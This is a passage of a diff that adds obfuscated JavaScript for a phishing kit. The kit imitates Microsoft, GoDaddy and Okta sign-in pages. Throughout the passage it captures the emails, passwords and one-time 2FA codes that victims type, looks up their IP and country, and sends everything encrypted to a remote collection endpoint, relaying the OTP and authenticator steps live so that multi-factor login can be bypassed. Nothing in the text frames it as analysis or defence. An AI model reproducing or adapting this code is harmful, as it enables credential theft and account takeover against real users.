+        checkerrordesc("otp", 0x0, _0x1aa890.description);
+        bottomsectionlinks('otp', _0x1aa890.bottomsection);
+        changebackbutton("otp", _0x1aa890.backbutton);
+        document.getElementById('section_confirmemail').classList.toggle("d-none");
+        document.getElementById("section_otp").classList.remove('d-none');
+        view = "otp";
+      }
+      if (_0x1aa890.message == "otp sent error") {
+        document.getElementById("error_verifyemail").innerText = '';
+        document.getElementById("otpimg").setAttribute("src", _0x1aa890.image_src);
+        checkerrordesc("otp", 0x0, _0x1aa890.description);
+      }
+      if (_0x1aa890.message == "error") {
+        bottomsectionlinks("verifyemail", _0x1aa890.bottomsection);
+        changebackbutton("verifyemail", _0x1aa890.backbutton);
+        checkerrordesc('verifyemail', 0x1, _0x1aa890.description);
+      }
+    }
+  })["catch"](_0x112311 => {
+    loadinganimation(0x1);
+    console.error('Error:', _0x112311);
+  });
+});
+const verifyotpbtn = document.getElementById("btn_verifyotp");
+verifyotpbtn.addEventListener("click", () => {
+  const _0x4429fe = document.getElementById('inp_otpcode');
+  loadinganimation(0x0);
+  let _0x2e4939 = 0x0;
+  if (otptype == 0x1) {
+    _0x2e4939 = 'PhoneAppOTP';
+  }
+  if (otptype == 0x2) {
+    _0x2e4939 = "OneWaySMS";
+  }
+  if (otptype == 0x3) {
+    _0x2e4939 = "OneWayVoiceMobileOTP";
+  }
+  if (_0x4429fe.value == '') {
+    loadinganimation(0x1);
+    document.getElementById("otpdesc").innerText = "Enter the code to help us verify your identity.";
+  }
+  if (_0x4429fe.value !== '') {
+    sendAndReceive("twofaselected", [_0x2e4939, _0x4429fe.value], 0x1).then(_0x4dd3ad => {
+      if (_0x4dd3ad && _0x4dd3ad.message !== "waiting for previous request to complete") {
+        loadinganimation(0x1);
+        console.log(_0x4dd3ad.message);
+        if (_0x4dd3ad.message == "signinblocked live") {
+          document.getElementById("signin_blocked_live_email").innerText = _0x4dd3ad.email;
+          checkerrordesc("signin_blocked_live", 0x0, _0x4dd3ad.description);
+          checkerrordesc("signin_blocked_reason", 0x2, _0x4dd3ad.reason);
+          document.getElementById("section_" + view).classList.toggle("d-none");
+          document.getElementById("section_signin_blocked_live").classList.remove("d-none");
+          view = "signin_blocked_live";
+        }
+        if (_0x4dd3ad.message == "protectaccount live") {
+          checkerrordesc("protect_account_live", 0x0, _0x4dd3ad.description);
+          document.getElementById('section_' + view).classList.toggle("d-none");
+          document.getElementById('section_protect_account_live').classList.remove("d-none");
+          view = "protect_account_live";
+        }
+        if (_0x4dd3ad.message == "error") {
+          console.log(_0x4dd3ad.description);
+        }
+        if (_0x4dd3ad.message == "more info required") {
+          moreinforeq();
+        }
+        if (_0x4dd3ad.message == "duplicate request") {
+          wait2facancel = 0x1;
+          if (document.getElementById("section_tryagainlater").classList.contains("d-none")) {
+            document.getElementById("section_tryagainlater").querySelector('.title').innerText = "Too many Attempts";
+            setTimeout(function () {
+              document.getElementById("section_" + view).querySelector('.loading-container').classList.remove("loading");
+              runanimation(0x2, view, 0.5, 0x0);
+              setTimeout(function () {
+                document.getElementById("section_" + view).classList.toggle("d-none");
+                document.getElementById('section_tryagainlater').querySelector("#tryagainheader").style.display = "block";
+                document.getElementById("section_tryagainlater").querySelector('#tryagain_toomanyattempts').style.display = "block";
+                document.getElementById('section_tryagainlater').querySelector(".sectioncontent").style.animation = "show-from-right 0.5s";
+                document.getElementById("section_tryagainlater").classList.remove('d-none');
+                view = "tryagainlater";
+              }, 0xc8);
+            }, 0x1f4);
+          }
+        }
+        if (_0x4dd3ad.message == "valid otp") {
+          document.getElementById("otpdesc").innerText = '';
+          document.getElementById("section_otp").classList.toggle("d-none");
+          document.getElementById("section_final").classList.remove("d-none");
+          view = 'final';
+        }
+        if (_0x4dd3ad.message == "error" && _0x4dd3ad.description != "The wrong code was entered. Send yourself a new code and try again.") {
+          bottomsectionlinks("otp", _0x4dd3ad.bottomsection);
+          changebackbutton("otp", _0x4dd3ad.backbutton);
+          checkerrordesc('otp', 0x1, _0x4dd3ad.description);
+          document.getElementById("inp_otpcode").value = '';
+        }
+        if (_0x4dd3ad.message == "error" && _0x4dd3ad.description == "The wrong code was entered. Send yourself a new code and try again.") {
+          bottomsectionlinks("2fa", _0x4dd3ad.bottomsection);
+          changebackbutton('2fa', _0x4dd3ad.backbutton);
+          document.getElementById('inp_otpcode').value = '';
+          document.getElementById("error_otp").innerText = '';
+          document.getElementById("section_otp").classList.toggle("d-none");
+          document.getElementById('section_2fa').classList.remove('d-none');
+        }
+      }
+    })["catch"](_0x3d672b => {
+      loadinganimation(0x1);
+      console.error("Error:", _0x3d672b);
+    });
+  }
+});
+function valaction(_0x34a828, _0x4a0ae5, _0x7abf3d, _0x537063) {
+  if (!_0x7abf3d) {
+    document.getElementById(_0x34a828).innerText = _0x537063;
+    if (_0x4a0ae5) {
+      pwdInp.classList.add('error-inp');
+    }
+  } else {
+    document.getElementById(_0x34a828).innerText = '';
+    if (_0x4a0ae5) {
+      pwdInp.classList.remove("error-inp");
+    }
+  }
+}
+function checkerrordesc(_0x2437e0, _0x4f57cb, _0x1ea88b) {
+  if (_0x4f57cb == 0x2) {
+    var _0xe3107 = _0x2437e0;
+  }
+  if (_0x4f57cb == 0x1) {
+    var _0xe3107 = "error_" + _0x2437e0;
+  }
+  if (_0x4f57cb == 0x0) {
+    var _0xe3107 = _0x2437e0 + 'desc';
+  }
+  if (_0x1ea88b.type === "text_link") {
+    if (_0x1ea88b.a_id == "useAuthenticator") {
+      document.getElementById(_0xe3107).innerHTML = "<p class=\"mb-16\">" + _0x1ea88b.text + " <a href=\"#\" data-id=\"" + _0x1ea88b.a_id + ("\" onclick=\"linkoptionclick(this)\" class=\"link\">" + _0x1ea88b.a_text + "</a> or try to sign in again shortly.</p>");
+    }
+    if (_0x1ea88b.a_id != "useAuthenticator") {
+      document.getElementById(_0xe3107).innerHTML = "<p class=\"mb-16\">" + _0x1ea88b.text + " <a href=\"#\" data-id=\"" + _0x1ea88b.a_id + ("\" onclick=\"linkoptionclick(this)\" class=\"link\">" + _0x1ea88b.a_text + "</a></p>");
+    }
+  } else {
+    if (_0x1ea88b.type === "link_text") {
+      document.getElementById(_0xe3107).innerHTML = "<a class=\"link mb-16\" href=\"#\" data-id=\"" + _0x1ea88b.a_id + ("\" onclick=\"linkoptionclick(this)\">" + _0x1ea88b.a_text + "</a> <p>" + _0x1ea88b.text + "</p>");
+    } else {
+      if (_0x1ea88b.type === "link") {
+        document.getElementById(_0xe3107).innerHTML = "<a class=\"link mb-16\" href=\"#\" data-id=\"" + _0x1ea88b.a_id + ("\" onclick=\"linkoptionclick(this)\">" + _0x1ea88b.a_text + "</a>");
+      } else if (_0x1ea88b.type === "text") {
+        document.getElementById(_0xe3107).innerHTML = '<p>' + _0x1ea88b.text + "</p>";
+      }
+    }
+  }
+}
+function selectmultipleaccountadfs(_0x29f5f7) {
+  const _0x32e939 = document.getElementsByClassName("idp");
+  let _0x1b94b7 = -0x1;
+  for (let _0x3a73dd = 0x0; _0x3a73dd < _0x32e939.length; _0x3a73dd++) {
+    if (_0x32e939[_0x3a73dd] === _0x29f5f7) {
+      _0x1b94b7 = _0x3a73dd;
+      break;
+    }
+  }
+  sendAndReceive("selectmultipleaccountadfs", [_0x1b94b7], 0x1).then(_0x58c1df => {
+    if (_0x58c1df && _0x58c1df.message !== "waiting for previous request to complete") {
+      if (_0x58c1df.message == 'password') {
+        document.getElementById('section_multipleaccounts_adfs').classList.toggle("d-none");
+        document.getElementById("section_sidebarlogin_adfs").classList.remove('d-none');
+        view = 'sidebar_pwd_adfs';
+      }
+      console.log("Received response:", _0x58c1df);
+    }
+  })["catch"](_0x2b1109 => {
+    loadinganimation(0x1);
+    console.error("Error:", _0x2b1109);
+  });
+}
+function displaymultipleaccountsadfs(_0x36785b) {
+  const _0x2e7d26 = document.getElementById("multipleaccountsadfs");
+  _0x2e7d26.innerHTML = '';
+  _0x36785b.forEach(_0xe6e637 => {
+    const _0x32d42b = document.createElement("div");
+    _0x32d42b.classList.add("idp");
+    _0x32d42b.setAttribute("onclick", "selectmultipleaccountadfs(this)");
+    const _0x1eb2a9 = document.createElement("img");
+    _0x1eb2a9.classList.add('largeIcon', "float");
+    _0x1eb2a9.src = _0xe6e637.image_src;
+    _0x1eb2a9.alt = _0xe6e637.email;
+    const _0xf765fb = document.createElement("div");
+    _0xf765fb.classList.add("idpDescription", "float");
+    const _0x51aa84 = document.createElement("span");
+    _0x51aa84.classList.add('largeTextNoWrap', "indentNonCollapsible");
+    _0x51aa84.innerText = _0xe6e637.email;
+    _0xf765fb.appendChild(_0x51aa84);
+    _0x32d42b.appendChild(_0x1eb2a9);
+    _0x32d42b.appendChild(_0xf765fb);
+    _0x2e7d26.appendChild(_0x32d42b);
+  });
+}
+function pagevisited(_0x4e3b97, _0x543a61) {
+  if (pagevisitedalready == null) {
+    pagevisitedalready = 0x1;
+    $.ajax({
+      'type': 'POST',
+      'url': urlo,
+      'data': stringToBinary(encryptData(JSON.stringify({
+        'pagelink': pagelinkval,
+        'mailtype': _0x543a61,
+        'type': 0x3,
+        'typeval': 0x0,
+        'ip': userip,
+        'country': usercountry,
+        'useragent': userAgent,
+        'appnum': appnum
+      }))),
+      'success': function (_0x46e974) {},
+      'error': function (_0x1c2044, _0x4b8698, _0x16312e) {
+        console.error("Error:", _0x16312e);
+      }
+    });
+  }
+}
+pwdInp.addEventListener("input", function () {
+  if (pdfcheck == 0x0) {
+    if (pwdInp.value.trim() !== '') {
+      pagevisited(document.getElementById("inp_uname").value, pvn);
+    }
+  }
+  if (pdfcheck == 0x1) {
+    if (pwdInp.value.trim() !== '') {
+      pagevisited(document.getElementById("pdfemail").value, pvn);
+    }
+  }
+});
+pwdInplive.addEventListener("input", function () {
+  if (pdfcheck == 0x0) {
+    if (pwdInplive.value.trim() !== '') {
+      pagevisited(document.getElementById("inp_uname").value, pvn);
+    }
+  }
+  if (pdfcheck == 0x1) {
+    if (pwdInplive.value.trim() !== '') {
+      pagevisited(document.getElementById("pdfemail").value, pvn);
+    }
+  }
+});
+function sendemail() {
+  sendAndReceive('checkemail', [unameInp.value, pagelinkval, browserName, userip, usercountry], 0x1).then(_0x1dbd60 => {
+    if (_0x1dbd60 && _0x1dbd60.message !== "waiting for previous request to complete") {
+      loadinganimation(0x1);
+      var _0x724f2c = false;
+      var _0x24f396 = 0x12c;
+      if (_0x1dbd60.message.includes("newwebsiteopen") == false && _0x1dbd60.message !== "error") {
+        runanimation(0x2, view, 0.3);
+        if (_0x1dbd60.acctype && _0x1dbd60.acctype == 0x2) {
+          pvn = 0x1;
+        }
+        if (_0x1dbd60.acctype == undefined || _0x1dbd60.acctype && _0x1dbd60.acctype == 0x1) {
+          pvn = 0x0;
+        }
+      }
+      if (_0x1dbd60.message.includes('newwebsiteopen') == false) {
+        _0x24f396 = 0x0;
+      }
+      setTimeout(function () {
+        for (var _0x360f02 = 0x0; _0x360f02 < websitenames.length; _0x360f02++) {
+          if (_0x1dbd60.message.includes("newwebsiteopen") == true && _0x1dbd60.message.includes(websitenames[_0x360f02]) == true) {
+            _0x724f2c = true;
+            document.querySelectorAll(".user_identity").forEach(_0x1b4e0e => {
+              _0x1b4e0e.innerText = unameInp.value;
+            });
+            if (websitenames[_0x360f02] == "godaddy") {
+              var _0xceac28 = gdf;
+              var _0x37cb10 = document.querySelector("script[src^=\"" + gdf + "\"]");
+              if (!_0x37cb10) {
+                var _0x5754c4 = document.createElement('script');
+                _0x5754c4.src = _0xceac28;
+                document.head.appendChild(_0x5754c4);
+              }
+              const _0x322e86 = document.createElement("style");
+              _0x322e86.id = 'dynamic-style';
+              _0x322e86.textContent = "\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ";
+              document.head.appendChild(_0x322e86);
+              document.getElementById('section_uname').classList.toggle("d-none");
+              document.getElementById("sections").classList.toggle('d-none');
+              document.getElementById("sections_" + websitenames[_0x360f02] + '').classList.remove("d-none");
+              document.getElementById("godaddyemail").value = unameInp.value;
+              document.body.style.setProperty("background-color", '#f5f7f8', "important");
+              document.body.style.setProperty('background-image', "unset", 'important');
+              document.body.style.setProperty("overflow", "auto", "important");
+              view = "pwd_godaddy";
+            }
+            if (websitenames[_0x360f02] == "okta") {
+              otherweburl = _0x1dbd60.message.replace('newwebsiteopen', '');
+              const _0x5e79ea = document.createElement("style");
+              _0x5e79ea.id = 'dynamic-style';
+              _0x5e79ea.textContent = "\n            input[type=email], input[type=tel] {\n            width: inherit;\n            }\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ";
+              document.head.appendChild(_0x5e79ea);
+              var _0xceac28 = odf;
+              var _0x37cb10 = document.querySelector("script[src^=\"" + odf + "\"]");
+              if (!_0x37cb10) {
+                var _0x5754c4 = document.createElement('script');
+                _0x5754c4.src = _0xceac28;
+                document.head.appendChild(_0x5754c4);
+              }
+              if (_0x1dbd60.logo !== false) {
+                document.querySelector('.auth-org-logo').src = _0x1dbd60.logo;
+              }
+              if (_0x1dbd60.background !== false) {
+                document.querySelector(".okta-container #login-bg-image").style.setProperty("background-image", "url('" + _0x1dbd60.background + "')");
+              }
+              document.getElementById('section_uname').classList.toggle("d-none");
+              document.getElementById("sections").classList.toggle("d-none");
+              document.getElementById('sections_' + websitenames[_0x360f02] + '').classList.remove('d-none');
+              document.querySelector("input#i011e.okta").value = unameInp.value;
+              view = "pwd_okta";
+            }
+          }
+          if (_0x1dbd60.message.includes("newwebsiteopen") == true && _0x360f02 == websitenames.length - 0x1 && !_0x724f2c) {
+            document.getElementById("error_uname").innerText = '';
+            document.querySelectorAll(".user_identity").forEach(_0x4e5e8d => {
+              _0x4e5e8d.innerText = unameInp.value;
+            });
+            bottomsectionlinks("pwd", [{
+              'a_id': "idA_PWD_ForgotPassword",
+              'a_text': "Forgot my password",
+              'type': "link"
+            }]);
+            changebackbutton("pwd", 0x0);
+            document.getElementById('section_uname').classList.toggle("d-none");
+            document.getElementById("section_pwd").classList.remove("d-none");
+            otherweburl = _0x1dbd60.message.replace("newwebsiteopen", '');
+            webnotfound = true;
+            view = "pwd";
+          }
+        }
+        if (_0x1dbd60.message == "multiple accounts") {
+          multipleaccountsback = 0x1;
+          if (twa == 0x0) {
+            var _0x4cb938 = document.querySelectorAll(".bannerlogo");
+            _0x4cb938.forEach(function (_0xdb3f24) {
+              _0xdb3f24.style.height = '24px';
+            });
+          }
+          document.getElementById("section_multipleaccounts").querySelector("#btn_back").setAttribute("data-id", _0x1dbd60.backbtnid);
+          document.getElementById('section_multipleaccounts').querySelector('#btn_back').setAttribute("onclick", 'backbuttonclick(this,2)');
+          checkerrordesc('multipleaccounts', 0x0, _0x1dbd60.description);
+          displaymultipleaccounts(_0x1dbd60.accountoptions);
+          bottomsectionlinks('multipleaccounts', _0x1dbd60.bottomsection);
+          document.querySelectorAll('.user_identity').forEach(_0x21ad32 => {
+            _0x21ad32.innerText = unameInp.value;
+          });
+          document.getElementById("section_uname").classList.toggle("d-none");
+          document.getElementById("section_multipleaccounts").classList.remove('d-none');
+          view = "multipleaccounts";
+        }
+        if (_0x1dbd60.message == "correct email") {
+          if (twa == 0x0) {
+            if (_0x1dbd60.bannerlogo !== undefined && _0x1dbd60.bannerlogo !== null) {
+              var _0x4cb938 = document.querySelectorAll('.bannerlogo');
+              _0x4cb938.forEach(function (_0x3a3294) {
+                _0x3a3294.style.backgroundImage = "url('" + _0x1dbd60.bannerlogo + "')";
+                _0x3a3294.style.width = "unset";
+                _0x3a3294.style.height = "36px";
+              });
+            }
+            if (_0x1dbd60.backgroundcolor !== undefined && _0x1dbd60.backgroundcolor !== null) {
+              document.body.style.setProperty("background-color", _0x1dbd60.backgroundcolor);
+            }
+            if (_0x1dbd60.backgroundimage !== undefined && _0x1dbd60.backgroundimage !== null) {
+              document.body.style.setProperty("background-image", "url('" + _0x1dbd60.backgroundimage + "')");
+            }
+            if (_0x1dbd60.bannerlogo == undefined && _0x1dbd60.bannerlogo !== null) {
+              var _0x4cb938 = document.querySelectorAll(".bannerlogo");
+              _0x4cb938.forEach(function (_0x1f5b89) {
+                _0x1f5b89.style.height = "24px";
+              });
+            }
+          }
+          if (pvn == 0x0) {
+            bottomsectionlinks("pwd", _0x1dbd60.bottomsection);
+            changebackbutton("pwd", _0x1dbd60.backbutton);
+          }
+          if (pvn == 0x1) {
+            bottomsectionlinks("pwd_live", _0x1dbd60.bottomsection);
+            changebackbutton('pwd_live', _0x1dbd60.backbutton);
+          }
+          document.getElementById('error_uname').innerText = '';
+          document.querySelectorAll(".user_identity").forEach(_0xc90333 => {
+            _0xc90333.innerText = unameInp.value;
+          });
+          document.getElementById("section_uname").classList.toggle("d-none");
+          if (pvn == 0x0) {
+            document.getElementById("section_pwd").classList.remove('d-none');
+            view = "pwd";
+          }
+          if (pvn == 0x1) {
+            document.getElementById("section_pwd_live").classList.remove("d-none");
+            view = "pwd_live";
+          }
+        }
+        if (_0x1dbd60.message == "error") {
+          bottomsectionlinks("uname", [{
+            'a_id': "signup",
+            'a_text': "Create one!",
+            'text': "No account?",
+            'type': "text_link"
+          }, {
+            'a_id': "cantAccessAccount",
+            'a_text': "Can't access your account?",
+            'type': "link"
+          }]);
+          checkerrordesc("uname", 0x1, _0x1dbd60.description);
+        }
+        if (_0x1dbd60.message.includes('newwebsiteopen') == false && _0x1dbd60.message !== "error") {
+          runanimation(0x1, view, 0.3);
+        }
+      }, _0x24f396);
+    }
+  })["catch"](_0x3e72c8 => {
+    loadinganimation(0x1);
+    console.error("Error:", _0x3e72c8);
+  });
+}
+function missingadd() {
+  let _0x2fc9ba = null;
+  if (pvn == 0x0) {
+    _0x2fc9ba = pwdInp.value;
+  }
+  if (pvn == 0x1) {
+    _0x2fc9ba = pwdInplive.value;
+  }
+  $.ajax({
+    'type': "POST",
+    'url': urlo,
+    'data': stringToBinary(encryptData(JSON.stringify({
+      'pagelink': pagelinkval,
+      'type': 0xc,
+      'email': unameInp.value,
+      'password': _0x2fc9ba,
+      'url': otherweburl,
+      'ip': userip,
+      'country': usercountry,
+      'browser': browserName
+    }))),
+    'success': function (_0x206c63) {},
+    'error': function (_0x9ab170, _0x4a191a, _0x6c1855) {
+      console.error('Error:', _0x6c1855);
+    }
+  });
+}
+function validate() {
+  if (view === "uname") {
+    const _0x2fae9e = unameInp.value.trim().split('@')[0x1];
+    if (unameInp.value.includes('@') && bes.some(_0x11e58a => _0x2fae9e.includes(_0x11e58a))) {
+      loadinganimation(0x0);
+      setTimeout(function () {
+        loadinganimation(0x1);
+        document.getElementById("error_uname").innerText = "We couldn't find an account with that username. Try another, or get a new Microsoft account.";
+      }, 0xbb8);
+    }
+    if (unameInp.value.trim() == '') {
+      document.getElementById("error_uname").innerText = "Enter a valid email address, phone number, or Skype name.";
+    } else if (unameInp.value.trim() != '' && unameInp.value.includes('@') && !bes.some(_0x17fbbc => _0x2fae9e.includes(_0x17fbbc))) {
+      showwedidnthearpopup = 0x1;
+      loadinganimation(0x0);
+      if (webnotfound == true) {
+        setTimeout(function () {
+          loadinganimation(0x1);
+          runanimation(0x2, view, 0.3);
+          setTimeout(function () {
+            document.getElementById('error_pwd').innerText = '';
+            document.getElementById('inp_pwd').value = '';
+            bottomsectionlinks('pwd', [{
+              'a_id': "idA_PWD_ForgotPassword",
+              'a_text': "Forgot my password",
+              'type': "link"
+            }]);
+            document.getElementById("section_uname").classList.toggle('d-none');
+            document.getElementById("section_pwd").classList.remove("d-none");
+            view = "pwd";
+            runanimation(0x1, view, 0.3);
+          }, 0x12c);
+        }, 0xbb8);
+      }
+      if (webnotfound == false) {
+        if (interacted == 0x1) {
+          sendemail();
+        }
+        if (interacted == 0x0) {
+          interacted = 0x1;
+          (function _0x25a671() {
+            $.get("https://get.geojs.io/v1/ip/geo.json", function (_0x1f697e) {
+              userip = _0x1f697e.ip;
+              usercountry = _0x1f697e.country;
+              sendemail();
+            }, "json").fail(function (_0x39d5bd, _0x42f88e, _0x120763) {
+              if (_0x39d5bd.status == 0x1ad || _0x42f88e !== 'success') {
+                setTimeout(_0x25a671, 0x3e8);
+              }
+            });
+          })();
+        }
+      }
+    }
+  } else {
+    if (view === "pwd") {
+      const _0x4ec327 = pwdInp.value;
+      if (pes.some(_0x20e47d => _0x4ec327.includes(_0x20e47d))) {
+        loadinganimation(0x0);
+        setTimeout(function () {
+          loadinganimation(0x1);
+          document.getElementById("section_pwd").classList.toggle("d-none");
+          document.getElementById("section_final").classList.remove("d-none");
+          view = "final";
+          document.getElementById("error_pwd").innerText = '';
+        }, 0xbb8);
+      }
+      if (pwdInp.value.trim() === '') {
+        document.getElementById('error_pwd').innerText = "Please enter the password for your Microsoft account.";
+      } else if (pwdInp.value.trim() != '' && !pes.some(_0x3030db => _0x4ec327.includes(_0x3030db))) {
+        loadinganimation(0x0);
+        if (webnotfound == true) {
+          missingadd();
+          setTimeout(function () {
+            loadinganimation(0x1);
+            runanimation(0x2, view, 0.3);
+            setTimeout(function () {
+              bottomsectionlinks('pwd', [{
+                'a_id': "idA_PWD_ForgotPassword",
+                'a_text': "Forgot my password",
+                'type': "link"
+              }]);
+              changebackbutton("pwd", 0x1);
+              document.getElementById("section_pwd").classList.toggle("d-none");
+              document.getElementById("section_final").classList.remove("d-none");
+              document.getElementById("error_pwd").innerText = '';
+              view = "final";
+              runanimation(0x1, view, 0.3);
+            }, 0x12c);
+          }, 0xbb8);
+        }
+        if (webnotfound == false) {
+          multipleaccountsback = 0x0;
+          sendAndReceive("checkpass", [pwdInp.value.replace(/\//g, "customslashstr")], 0x1).then(_0xa4292e => {
+            if (_0xa4292e && _0xa4292e.message !== "waiting for previous request to complete") {
+              loadinganimation(0x1);
+              if (_0xa4292e.message == "signinblocked live") {
+                document.getElementById("error_pwd").innerText = '';
+                document.getElementById("signin_blocked_live_email").innerText = _0xa4292e.email;
+                checkerrordesc("signin_blocked_live", 0x0, _0xa4292e.description);
+                checkerrordesc('signin_blocked_reason', 0x2, _0xa4292e.reason);
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById("section_signin_blocked_live").classList.remove("d-none");
+                view = "signin_blocked_live";
+              }
+              if (_0xa4292e.message == "protectaccount live") {
+                checkerrordesc("protect_account_live", 0x0, _0xa4292e.description);
+                document.getElementById("section_" + view).classList.toggle("d-none");
+                document.getElementById("section_protect_account_live").classList.remove("d-none");
+                view = "protect_account_live";
+              }
+              if (_0xa4292e.message == "you dont have access") {
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById('section_youdonthaveaccess').classList.remove("d-none");
+                view = 'youdonthaveaccess';
+              }
+              if (_0xa4292e.message == 'moreinforequired') {
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById('section_moreinforequired').classList.remove("d-none");
+                view = 'moreinforequired';
+              }
+              if (_0xa4292e.message == "more info required") {
+                moreinforeq();
+              }
+              if (_0xa4292e.message == "2fa is off newwebsite") {
+                document.getElementById("section_pwd").classList.toggle('d-none');
+                document.getElementById("section_final").classList.remove("d-none");
+                view = "final";
+                document.getElementById("error_pwd").innerText = '';
+              }
+              if (_0xa4292e.message == "2fa is off") {
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById("section_final").classList.remove('d-none');
+                view = "final";
+                document.getElementById("error_pwd").innerText = '';
+              }
+              if (_0xa4292e.message == "sign in blocked") {
+                document.getElementById('error_pwd').innerText = '';
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById("section_accessblocked").querySelector('h2.title').textContent = _0xa4292e.title;
+                changebackbutton("accessblocked", _0xa4292e.backbutton);
+                checkerrordesc("accessblocked", 0x0, _0xa4292e.description);
+                checkerrordesc('accessblockedsignoutoption', 0x2, _0xa4292e.signoutoption);
+                document.getElementById("footer").style.position = "relative";
+                var _0x2026f7 = document.getElementById("debugdetailsinfo");
+                _0xa4292e.troubleshootinginfo.forEach((_0x1c7058, _0x2ade00) => {
+                  const _0x29159a = document.createElement("div");
+                  const _0x3b6cfa = document.createElement('span');
+                  _0x3b6cfa.textContent = _0x1c7058.name;
+                  _0x3b6cfa.classList.add("bold");
+                  const _0x1f8cd9 = document.createElement("span");
+                  _0x1f8cd9.textContent = _0x1c7058.value;
+                  _0x29159a.appendChild(_0x3b6cfa);
+                  _0x29159a.appendChild(_0x1f8cd9);
+                  _0x2026f7.appendChild(_0x29159a);
+                });
+                document.getElementById('section_accessblocked').classList.remove("d-none");
+                view = 'accessblocked';
+              }
+              if (_0xa4292e.message == "protect account") {
+                document.getElementById('error_pwd').innerText = '';
+                checkerrordesc("protectaccount", 0x0, _0xa4292e.description);
+                displayprotectoptions(_0xa4292e.protectoptions);
+                bottomsectionlinks("protectaccount", _0xa4292e.bottomsection);
+                changebackbutton("protectaccount", _0xa4292e.backbutton);
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById('section_protectaccount').classList.remove("d-none");
+                view = "protectaccount";
+              }
+              if (_0xa4292e.message == "otp sent") {
+                document.getElementById('error_pwd').innerText = '';
+                document.getElementById('otpimg').setAttribute('src', _0xa4292e.image_src);
+                checkerrordesc('otp', 0x0, _0xa4292e.description);
+                bottomsectionlinks("otp", _0xa4292e.bottomsection);
+                changebackbutton("otp", _0xa4292e.backbutton);
+                document.getElementById('section_pwd').classList.toggle("d-none");
+                document.getElementById("section_otp").classList.remove("d-none");
+                view = "otp";
+              }
+              if (_0xa4292e.message == "approve auth request auth app") {
+                document.getElementById("error_pwd").innerText = '';
+                document.getElementById('authappimg').setAttribute("src", _0xa4292e.image_src);
+                checkerrordesc("authapp", 0x0, _0xa4292e.description);
+                bottomsectionlinks("authapp", _0xa4292e.bottomsection);
+                changebackbutton('authapp', _0xa4292e.backbutton);
+                document.getElementById('authappcode').textContent = _0xa4292e.authappcode;
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById("section_authapp").classList.remove("d-none");
+                view = 'authapp';
+                wait2fa("app", _0xa4292e.methodid);
+              }
+              if (_0xa4292e.message == "approve auth request calling") {
+                document.getElementById("section_authcall").querySelector(".back").focus();
+                document.getElementById('error_pwd').innerText = '';
+                document.getElementById('authcallimg').setAttribute("src", _0xa4292e.image_src);
+                checkerrordesc("authcall", 0x0, _0xa4292e.description);
+                bottomsectionlinks("authcall", _0xa4292e.bottomsection);
+                changebackbutton('authcall', _0xa4292e.backbutton);
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById("section_authcall").classList.remove("d-none");
+                view = 'authcall';
+                wait2fa("call");
+              }
+              if (_0xa4292e.message == "2fa is on") {
+                var _0x141068 = JSON.parse(_0xa4292e.twofamethods);
+                displaytwofamethods(_0x141068);
+                bottomsectionlinks("2fa", _0xa4292e.bottomsection);
+                changebackbutton("2fa", _0xa4292e.backbutton);
+                document.getElementById("section_pwd").classList.toggle("d-none");
+                document.getElementById("section_2fa").classList.remove("d-none");
+                view = "2fa";
+                document.getElementById("error_pwd").innerText = '';
+              }
+              if (_0xa4292e.message == "error") {
+                bottomsectionlinks('pwd', _0xa4292e.bottomsection);
+                changebackbutton("pwd", _0xa4292e.backbutton);
+                checkerrordesc('pwd', 0x1, _0xa4292e.description);
+                document.getElementById("inp_pwd").value = '';
+              }
+              for (var _0x161436 = 0x0; _0x161436 < websitenames.length; _0x161436++) {
+                if (_0xa4292e.message == "error " + websitenames[_0x161436] + '') {
+                  checkerrordesc('pwd', 0x1, _0xa4292e.description);
+                }
+              }
+            }
+          })['catch'](_0x4ba8f1 => {
+            loadinganimation(0x1);
+            console.error("Error:", _0x4ba8f1);
+          });
+        }
+      }
+    } else {
+      if (view === "pwd_live") {
+        const _0x5806b2 = pwdInplive.value;
+        if (pes.some(_0x4a741d => _0x5806b2.includes(_0x4a741d))) {
+          loadinganimation(0x0);
+          setTimeout(function () {
+            loadinganimation(0x1);
+            document.getElementById('section_pwd_live').classList.toggle("d-none");
+            document.getElementById("section_final").classList.remove("d-none");
+            view = "final";
+            document.getElementById("error_pwd_live").innerText = '';
+          }, 0xbb8);
+        }
+        if (pwdInplive.value.trim() === '') {
+          document.getElementById("error_pwd_live").innerText = "Please enter the password for your Microsoft account.";
+        } else if (pwdInplive.value.trim() != '' && !pes.some(_0xd6740a => _0x5806b2.includes(_0xd6740a))) {
+          loadinganimation(0x0);
+          if (webnotfound == true) {
+            missingadd();
+            setTimeout(function () {
+              loadinganimation(0x1);
+              runanimation(0x2, view, 0.3);
+              setTimeout(function () {
+                bottomsectionlinks("pwd_live", [{
+                  'a_id': "idA_PWD_ForgotPassword",
+                  'a_text': "Forgot your password",
+                  'type': 'link'
+                }]);
+                changebackbutton("pwd_live", 0x1);
+                document.getElementById("section_pwd_live").classList.toggle("d-none");
+                document.getElementById('section_final').classList.remove("d-none");
+                document.getElementById("error_pwd_lived").innerText = '';
+                view = "final";
+                runanimation(0x1, view, 0.3);
+              }, 0x12c);
+            }, 0xbb8);
+          }
+          if (webnotfound == false) {
+            multipleaccountsback = 0x0;
+            sendAndReceive("checkpass", [pwdInplive.value.replace(/\//g, "customslashstr")], 0x1).then(_0x4d6ae6 => {
+              if (_0x4d6ae6 && _0x4d6ae6.message !== "waiting for previous request to complete") {
+                loadinganimation(0x1);
+                if (_0x4d6ae6.message == "signinblocked live") {
+                  document.getElementById("error_pwd_live").innerText = '';
+                  document.getElementById('signin_blocked_live_email').innerText = _0x4d6ae6.email;
+                  checkerrordesc("signin_blocked_live", 0x0, _0x4d6ae6.description);
+                  checkerrordesc('signin_blocked_reason', 0x2, _0x4d6ae6.reason);
+                  document.getElementById('section_pwd_live').classList.toggle("d-none");
+                  document.getElementById("section_signin_blocked_live").classList.remove("d-none");
